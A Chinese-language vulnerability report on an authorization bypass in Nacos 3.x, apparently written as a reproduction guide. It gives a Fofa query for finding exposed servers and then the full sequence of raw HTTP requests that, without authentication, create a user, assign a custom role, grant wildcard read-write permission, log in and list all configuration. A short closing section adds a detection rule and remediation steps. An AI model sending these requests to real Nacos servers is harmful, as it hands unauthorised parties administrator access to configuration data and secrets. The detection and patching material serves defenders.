# Nacos 3.x 鉴权作用域错配

Nacos 3.x 鉴权作用域错配（未授权自建管理员）

# 影响版本

**3.0.0 ~ 3.2.3**

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa: app=&quot;nacos&quot; &amp;&amp; port=&quot;8848&quot;**

**POC/EXP：**

**step1 作为对照组：未授权访问 Admin 作用域，应 403**

结论：**Admin 作用域鉴权确实开启**，未授权被拒。这是漏洞存在的前提对照组。

```
GET /nacos/v3/admin/cs/config/list?pageNo=1&pageSize=10 HTTP/1.1
Host: 127.0.0.1:8848
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate

```

![image](assets/image-20260828215651-631aq1v.png)​

**step2 检测点：未授权读取用户列表，应为 200**

结论：用户管理接口与 步骤一 同属后台管理功能，却**未授权放行**——作用域错配确认，漏洞存在。

```
GET /nacos/v3/auth/user/list?pageNo=1&pageSize=10 HTTP/1.1
Host: 127.0.0.1:8848
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate


```

![image](assets/image-20260828215727-v0ndro9.png)​

**step3 未授权创建账户**

显示成功创建账户

```
POST /nacos/v3/auth/user HTTP/1.1
Host: 127.0.0.1:8848
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

username=poc_3xreport&password=Poc_3xReport!2026
```

![image](assets/image-20260828215820-3lct4h1.png)​

**step4 未授权绑定自定义角色**

内置 `<span leaf="">ROLE_ADMIN</span>`​ 被业务层保留（绑定会报 `<span leaf="">role 'ROLE_ADMIN' is not permitted to create!</span>`​），改用自定义角色，随后发 `<span leaf="">*:*</span>`​ 权限等效。

```
POST /nacos/v3/auth/role HTTP/1.1
Host: 127.0.0.1:8848
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

role=r_3xreport&username=poc_3xreport
```

![image](assets/image-20260828215906-mwk3f0q.png)​

**step5** 未授权发放 `<span leaf="">*:*</span>`​ 全量读写权限

```
POST /nacos/v3/auth/permission HTTP/1.1
Host: 127.0.0.1:8848
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

role=r_3xreport&resource=%2A%3A%2A&action=rw
```

![image](assets/image-20260828215930-aprongm.png)​

**step6 以注入账户登录，获取 accessToken**

`<span leaf="">nacos.core.auth.caching.enabled</span>`​ 默认开启，认证信息缓存约 15s 刷新延迟，创建后立刻登录会报 `<span leaf="">unknown user!</span>`​，需等待或重试（PoC 已内置 9 次 × 5s 重试）。

```
POST /nacos/v3/auth/user/login HTTP/1.1
Host: 127.0.0.1:8848
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

username=poc_3xreport&password=Poc_3xReport!2026
```

![image](assets/image-20260828220256-ow8kd50.png)​

JWT 解码：`<span leaf="">{"sub":"poc_3xreport","exp":1787941926}</span>`​。`<span leaf="">globalAdmin:false</span>`​ 说明权限完全来自自建角色。

![image](assets/image-20260828220042-fv7ouw1.png)​

**step7 管理员等价权限：列出全部配置 -- 对照step 1**

在步骤一中，完全相同的请求未授权时 403，现在 200——**权限提升完成**。

```
GET /nacos/v3/admin/cs/config/list?pageNo=1&pageSize=10 HTTP/1.1
Host: 127.0.0.1:8848
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: */*
accessToken: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwb2NfM3hyZXBvcnQiLCJleHAiOjE3ODc5NDE5MjZ9.3c_JSJcCJQoFrHgK86k3xwnJMirXQLn9urUD2u9tBDQ


```

![image](assets/image-20260828220349-ftl23ek.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"Nacos 3.x - /nacos/v3/admin/cs/config/list 鉴权作用域错配导致未授权访问";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/nacos/v3/admin/cs/config/list"; fast_pattern;
    metadata:
        service http,
        affected_product "Nacos 3.x",
        vulnerability_type "Authorization Bypass (Scope Misconfiguration)",
        severity "high";
    classtype:web-application-attack;
    sid:1000741;
    rev:1;
    priority:2;
)
```

# 漏洞修复

* 升级到 3.2.4 及以上
* 升级前临时缓解：开 `nacos.core.auth.enabled=true`​（OPEN_API 作用域也会鉴权），或者在网关上把 8848 的 `/v3/auth/*`​ 限到可信来源
* 排查是否已被打：看 `users`​/`roles`​/`permissions`​ 表里有没有来历不明、带 `*:*`​ 权限的账号；翻访问日志里 `POST /v3/auth/user`​、`POST /v3/auth/permission`​ 无 token 返回 2xx 的记录

‍
